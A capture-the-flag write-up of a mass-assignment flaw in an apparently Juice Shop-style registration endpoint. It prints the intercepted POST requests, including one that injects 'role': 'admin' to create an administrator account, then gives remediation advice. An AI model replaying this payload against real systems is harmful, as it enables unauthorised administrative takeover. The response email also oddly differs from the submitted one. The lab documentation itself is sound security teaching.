## [Improper Input Validation] - [Admin Registration]

## General Information

* **Difficulty Level :** ⭐⭐⭐ / 6
* **Date of Resolution :** 02-04-2026

---

## Vulnerability Analysis

* **Vulnerability Name :** Improper Input Validation
* **Affected Components :** API Endpoint (`/api/Users/`)
* **Severity :** <span style="color:red"> High </span>

---

## Proof of Concept (PoC)

#### 1. Enumeration & Techniques

* **Techniques used :** Web Traffic Analysis, Parameter Injection.
* **Tools used :** Burp Suite (Repeater)

#### 2. Reproduction Steps

**Step 1 : Endpoint Identification**

Navigate to the registration page `#/register` and fill in the standard informations (email, password, security question).

**Step 2 : Traffic Interception**

Submit the form and intercept the `POST` request with Burp Suite to `/api/Users/`. Analyze the JSON request. By default, the application only sends standard user fields.

```HTTP
POST /api/Users/ HTTP/2
Host: ctf.juice.cyber.epitest.eu
Content-Type: application/json

{
  "email": "admin-register@gg.gg",
  "password": "abc123-",
  "passwordRepeat": "abc123-",
  "securityQuestion": {
    "id": 3,
    "question": "Mother's birth date? (MM/DD/YY)"
  },
  "securityAnswer": "Idk"
}
```

**Step 3 : Traffic Manipulation**

Modify the JSON by injecting the `"role": "admin"` parameter. This exploits the backend's failure to filter sensitive attributes during the object creation process.

```HTTP
POST /api/Users/ HTTP/2
Host: ctf.juice.cyber.epitest.eu

{
  "email": "admin-register@gg.gg",
  "password": "abc123-",
  "passwordRepeat": "abc123-",
  "securityQuestion": {
    "id": 3,
    "question": "Mother's birth date? (MM/DD/YY)"
  },
  "securityAnswer": "Idk",
  "role": "admin"
}
```

**Step 4 : Privilege Escalation Confirmation**

The server returns a `HTTP/2 201 Created` response containing the body which confirms that the role has been successfully assigned as admin.

```JSON
{
  "status": "success",
  "data": {
    "id": 25,
    "email": "attacker@gg.gg",
    "role": "admin",
    "isActive": true,
    "createdAt": "2026-04-02T01:35:00.000Z"
  }
}
```

---

## Risk Assessment

* **Business Impact :** Full administrative takeover. An attacker can access the administration panel, manage all users, access sensitive logs, and potentially dump the user database, leading to a massive data breach.

* **Technical Description of the Impact :** This is a Mass Assignment vulnerability. The backend ORM (Object-Relational Mapping) automatically maps every key in the JSON request to the corresponding column in the database. Since the application does not "allow-list" the writable fields, any database column can be modified by the user during account creation.

---

## Actions & Remediation

#### Mitigation Strategies

   - Implement a strict schema to define exactly which fields are allowed to be processed.

   - Use an "Allow-List" approach to ignore any unexpected parameters in the request body.

#### Recommended Fixes

   - Explicitly set the role to "customer" in the backend logic, regardless of what is sent in the HTTP request.

   - Use features like "sanitized attributes" for sensitive columns like role, isAdmin or permissions.
